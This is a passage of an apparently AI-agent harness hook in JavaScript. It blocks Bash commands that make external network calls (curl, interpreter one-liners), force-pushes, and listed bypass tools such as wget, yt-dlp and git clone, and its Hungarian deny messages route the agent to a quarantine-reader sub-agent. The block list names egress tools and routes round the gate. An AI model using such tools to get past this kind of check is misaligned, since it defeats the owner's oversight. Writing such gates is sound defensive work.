      else if (INTERPRETER.test(cmd.toLowerCase()) && hasCodeFlag(cmd, cmdArgs) && usesNetwork(cmd, text)) target = 'one-liner'
      if (!target || gitOnly) continue
      // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
      // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
      // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
      // with URL_RE denied exactly that (#1514 re-review, measured on the merged head). An interpreter
      // one-liner has no argv to read, so its code is still scanned with URL_RE.
      let found
      const curlArgv = target === 'curl' ? argv : null
      const at = curlArgv ? curlArgv.findIndex((w) => w.split('/').pop() === 'curl') : -1
      if (at !== -1) found = curlDestinations(curlArgv.slice(at + 1), reading === 0 ? new Set(Object.keys(loops)) : null)
      else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: hosts.some((h) => h.startsWith(UNRESOLVED_PREFIX)) ? `${target}-unresolved` : `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
    }
  }
  return { deny: false, reason: null, hosts: [] }
}

const GIT_MSG =
  'Force-push TILTVA (git push --force / -f / --force-with-lease / --mirror / +refspec, tetszoleges ' +
  'alakban: beszurt kapcsolo, abszolut ut, git -C, bash -c). Force-pushhoz a tulajdonos elozetes, az adott ' +
  'muveletre szolo jovahagyasa kell; keresd a fo-agenst.'
const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl vagy interpreter-egysoros kulso URL-re, ' +
  'akkor is, ha az URL valtozoban van. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
const BYPASS_MSG = (agent) =>
  'Webes kerulo ut Bash-bol TILTVA ennel az ugynoknel (a gazda dontese, 2026-10-14): yt-dlp, npx playwright, git clone, git ls-remote, wget, pip download ' +
  `agensenkent engedelyezett${agent ? ` (te: ${agent}, ehhez az alakhoz nincs engedelyed)` : ' (az ugynokod nem azonosithato: nincs engedely)'}. ` +
  'Kulso tartalmat a quarantine-reader sub-ugynokon at kerj le; ha ez az alak kell a munkadhoz, kerd a fo-agenst.'
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch { process.exit(0) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  let r
  const agent = agentFromTranscript(payload?.transcript_path)
  try { r = classify(payload?.tool_input?.command, 0, loadVendorHosts(), loadVendorDomains(), process.argv.includes('--git-only'), { env: {}, loops: {}, agent }) } catch (e) { process.stderr.write(`bash-egress-parser: internal error, allowing: ${e?.message}\n`); process.exit(0) }
  if (r.deny) {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts, agent }) + '\n')
    } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: String(r.reason ?? '').startsWith('bypass-') ? `${BYPASS_MSG(agent)} (${r.reason})` : /(?:^|-)git-/.test(String(r.reason ?? '')) ? `${GIT_MSG} (${r.reason})` : `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})` } }))
  }
  process.exit(0)
}
